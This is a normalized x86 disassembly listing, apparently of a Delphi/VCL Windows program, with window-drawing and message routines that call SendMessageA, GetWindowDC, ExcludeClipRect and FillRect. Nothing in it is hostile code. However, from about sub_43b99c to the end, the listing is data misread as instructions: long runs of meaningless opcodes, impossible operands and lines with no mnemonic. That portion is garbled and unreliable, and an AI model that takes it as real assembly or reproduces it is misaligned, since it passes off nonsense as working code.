mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
call sub_44d030
mov eax ebx
call sub_43a9a4
mov [ ebx + 0x208 ] 0x1
test esi esi
jne r-xdata
mov dx [ ebp - 0x2 ]
dec edx
mov eax edi
dec eax
call sub_406b88
push eax
mov ecx esi
mov edx 0x465
mov eax ebx
call sub_44790c
dec eax
je r-xdata
or esi 0xffffffff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ ebx + 0x208 ] 0x0
sub_43ab38
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a9a4
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406b88
push eax
push 0x1
push 0x465
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43ab6c
push ebx
push esi
mov esi eax
mov bx [ esi + 0x238 ]
dec ebx
mov edx ebx
mov eax ebx
call sub_406b88
push eax
push 0x1
push 0x465
mov eax esi
call sub_44d054
push eax
call SendMessageA
mov [ esi + 0x208 ] 0x0
inc [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
sub_43abb0
push ebx
push esi
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor ebx ebx
mov bl 0x1
mov esi [ eax + 0x21c ]
mov [ edx ] esi
mov eax [ eax + 0x218 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43acc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ad37
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad3e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a18
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a18
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43af90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42c680
mov [ esi + 0x5 ] al
call sub_4361c4
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43b934
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_43afdc
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_43b07c
call sub_42c4c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_43b010
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43b07c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b0c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43b010
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43b10c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43b010
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b150
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43b010
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43b1b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404834
push eax
mov eax esi
call sub_404824
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43b010
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43b21c
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43b2a0
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43b2dc
mov [ ecx ] 0xe
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43b32c
mov [ ecx ] 0x14
xor eax eax
mov al dl
cmp eax 0x23
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43b349 ]
jmp [ eax * 4 + jump_table_43b36d ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x9
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x13
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x1d
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x22
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x23
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43b43c
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43b459 ]
jmp [ eax * 4 + jump_table_43b4c2 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43b7c8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43b923
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43b2a0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43b10c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_416f14
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43b950
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b98b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b992
retn
mov eax [ rw-data ]
call sub_403270
mov eax rw-data
call sub_403fe8
sub_43b99c
call sub_43fd5a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov edx 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xba
inc ebx
add dh cl
mov edx 0x2100043
add [ eax ] al
dec eax
xor [ eax + eax - 0x24 ] al
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ ebp * 8 - 0x2493ffbc ] dh
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
shl bh 0x43
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_43ba72
inc esp
add [ eax + ebp * 8 ] bl
inc ebx
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x18 ] bh
inc ebx
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 - 0x1da3ffbc ] al
inc esp
add ah ah
int3
sub_43bbe2
inc esp
add [ eax + ebp * 8 ] bl
inc ebx
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x18 ] bh
inc ebx
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 - 0x1da3ffbc ] al
inc esp
add ah ah
int3
sub_43cb7e
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] bh
clc
inc ebx
add ah dh
clc
inc ebx
add [ ecx + edi * 8 + 0x43 ] ah
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add [ eax ] cl
cli
inc ebx
add [ eax - 0x30 ] ch
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43cbba
inc esp
add al bh
inc ebx
add [ esi + esi * 8 ] dh
inc ebx
add al dh
cmc
inc ebx
add [ edi + esi * 8 - 0x99bffbd ] bl
inc ebx
add [ esi + esi * 8 ] dl
inc ebx
add al cl
test [ ebx ] 0x0
test [ ebx ] 0x300008
adc [ eax - 0x4ff14fe6 ] dh
adc [ ebp + 0x7bb012 ] edi
mov bl 0xff
sti
inc ebx
add [ ebx + edi * 8 - 0x3dfffbd ] ah
inc ebx
add al bl
sti
inc ebx
add [ eax ] al
cld
inc ebx
add [ esp + edi * 8 + 0x43 ] bl
add [ esp + edi * 8 - 0x4f7ffbd ] dl
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc ebx
je r-xdata
add [ eax ] ah
add al [ eax ]
add [ eax - 0x23ffbc36 ] ch
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ ebx + edi * 8 ] ch
cwde
int 0x43
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc ebx
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
add [ esp + esi - 0x4d3ffc0 ] dh
outsd
insd
inc ebp
imul esi [ fs : esp + esi * 8 - 0x36 ] 0x2f000043
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
push eax
inc ebx
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x18 ]
hlt
insb
fild [ eax + eax - 0x6c ]
mov [ 0xffffffff8b4c0044 ] eax
insb
jae r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0x2d770100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x10044d2 ]
int3
sub_43cd3a
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] bh
clc
inc ebx
add ah dh
clc
inc ebx
add [ ecx + edi * 8 + 0x43 ] ah
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add [ eax ] cl
cli
inc ebx
add [ eax - 0x30 ] ch
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43cdc8
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
push 0x10044dd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
mov edx 0x20c0045
insb
dec ecx
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
add [ edx + 0x1 ] ah
sub al [ eax + eax + 0x65 ]
add [ eax ] eax
sub al [ eax + eax + 0x64 ]
add [ eax ] eax
[ eax - 0x23 ]
add bh bh
lodsb [ esi ]
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
outsd
je r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc esp
add [ eax ] al
insb
pop esp
0x43
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
sub al [ eax + eax + 0x63 ]
add [ eax ] eax
[ eax - 0x23 ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + eax * 2 + 0x14 ]
popad
jae r-xdata
add bh bh
add al 0x69
inc esp
add [ eax ] ah
imul eax [ eax + eax ] 0x5800000
add [ eax ] al
call [ esi ]
add [ 0x6f6c6f43 ] al
jb r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
inc eax
adc al 0x44
fcomp [ esi ]
inc edx
add [ eax ] dh
add [ ebp - 0x6b00ffff ] ah
rol [ eax + eax - 0x48 ] 0x1
rol [ eax + eax ] 0x1
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
add bh bh
sub al 0xf4
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
push 0x44
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xbaa86564
inc ebp
add [ edx + eax ] cl
push edi
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
[ eax + 0x68 ]
inc esp
add [ eax + 0x68 ] ch
jae r-xdata
add dh bh
mov [ eax + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
adc [ edx ] eax
add bh bh
hlt
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
pop eax
push 0x68680044
jb r-xdata
inc esp
sbb al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_43cf53
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6b00ffff ] ah
rol [ eax + eax - 0x48 ] 0x1
rol [ eax + eax ] 0x1
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + eax * 2 + 0x14 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax + 0x68 ]
inc esp
add [ eax + 0x68 ] ch
jae r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
hlt
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
pop eax
push 0x68680044
jb r-xdata
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
sbb al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_43d560
add [ eax ] al
add [ eax ] al
add [ eax ] al
